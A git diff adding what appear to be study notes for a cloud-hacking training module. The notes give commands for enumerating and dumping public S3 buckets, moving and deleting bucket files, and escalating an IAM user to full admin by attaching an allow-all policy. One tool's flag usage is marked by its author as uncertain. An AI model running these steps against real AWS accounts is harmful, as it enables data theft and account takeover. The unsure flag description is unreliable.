@@ -1,17 +1,53 @@
 # Module 19 - Cloud Computing #
 
 ## Perform S3 Bucket Enumeration ##
+Information collected by S3 enumeration tools consists of a list of misconfigured S3 buckets that are available publicly. Attackers can exploit these buckets to gain unauthorized access to them, modify, delete and even exfiltrate the bucket content.
 
 ### lazys3 ###
+lazys3 is a Ruby script tool that is used to brute-force AWS S3 buckets using different permutations. This tool obtains publicly accessible S3 buckets and also allows to search the S3 buckets of a specific company by entering the company name.
+
+It can be downloaded: `git clone https://github.com/nahamsec/lazys3`. Or in Windows at: `Module 19 Cloud Computing\GitHub Tools\`.
+
+`ruby lazys3.rb (<Company>)`
 
 ### S3Scanner ###
+S3Scanner is a tool that finds the open S3 buckets and dumps their contents. It takes a list of bucket names to check as its input. 
+
+It can be downloaded: `git clone https://github.com/sa7mon/S3Scanner`. Or in Windows at: `Module 19 Cloud Computing\GitHub Tools\`. Then, install the requirements: `pip3 install -r requirements.txt`.
+
+* `python ./s3scanner.py <file containing the target URL - Ex. sites.txt>.txt` - To list the publicly available S3 Buckets
+* `python ./s3scanner.py --include-closed --out-file <output filename> --dump <file containing the target URL>.txt` - Dump all open buckets and log both open and closed buckets in the output file
+* `python ./s3scanner.py --list <file containing the target URL (?) - or output filename, i'm not sure>.txt` - Save the file listings of all open buckets to a file
+
+### Other S3 Bucket Enumeration Tools ###
+* S3Inspector (GitHub)
+* s3-buckets-bruteforcer (GitHub)
+* Mass3 (GitHub)
+* Bucket Finder (https://digi.ninja)
+* s3recon (GitHub)
 
 
 - - - -
 
 ## Exploit S3 Buckets ##
+Simple Storage Service (S3) is a scalable cloud storage service offered by Amazon Web Services (AWS) whereby files, folders and objects are stored via web APIs. Leavinga S3 bucket session running enables you to modify files such as JavaScript or related code and inject malware into the bucket files.
+
+Techniques used to identify AWS S3 Buckets:
+
+* Inspecting HTML: Analyze the source code of HTML web pages in the background to find URLs to the target S3 Buckets
+* Brute-Forcing URL: Brute-force the target bucket's URL to identify its correct URL
+* Finding Subdomains (Findsubdomains, Robtex...)
+* Reverse IP Search: To identify the domains of the target (Bing...)
+* Advanced Google Hacking
 
 ### AWS CLI ###
+The AWS Command-Line Interface (CLI) is a unified tool for managing AWS Services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts.
+
+`pip install awscli` > `aws configure` (Enter the needed details, provided in your an AWS account)
+
+* `aws s3 ls s3://<Bucket name>` - To list the directories in a Bucket
+* `aws s3 mv <file> s3://<Bucket name>` - To move a local file to the Bucket
+* `aws s3 rm s3://<Bucket name>/<file>` - To remove a file from the Bucket
 
 
 - - - -
@@ -19,7 +55,35 @@
 ## Perform Privilege Escalation ##
 
 ### Escalate IAM User Privileges by Exploiting Misconfigured User Policy ###
+After connecting to the AWS CLI and configuring it as shown before, let's create a user policy that gives administrator access to the target IAM user:
 
+`vim user-policy.json`
+
+```
+  {
+    "Version":"2012-10-17",
+    "Statement":[
+      {
+        "Effect":"Allow",
+        "Action":"*",
+        "Resource":"*"
+      }
+    ]
+  }
+```
+
+Now, let's attack the created policy to the target IAM user's account: 
+1. `aws iam create-policy --policy-name <policy name - Ex. user-policy> --policy-document file://user-policy.json`
+2. `aws iam attach-user-policy --user-name <target username> --policy-arn arn:aws:iam::<account id>:policy/user-policy`
+3. `aws iam list-attached-user-policies --user-name <target username> ` - Now we will see that the user has our policy attached to it
+4. Now we have admin rights, and can see sensitive information about the Bucket:
+    * `aws iam list-users` - To list all IAM users in the AWS environment
+    * `aws s3api list-buckets --query "Buckets[].Name"` - To list S3 Buckets
+    * `aws iam list-user-policies` - To list user policies
+    * `aws iam list-role-policies` - To list role policies
+    * `aws iam list-group-policies` - To list group policies
+    * `aws iam create-user` - To create a new user
+ 
 
 - - - - 
 
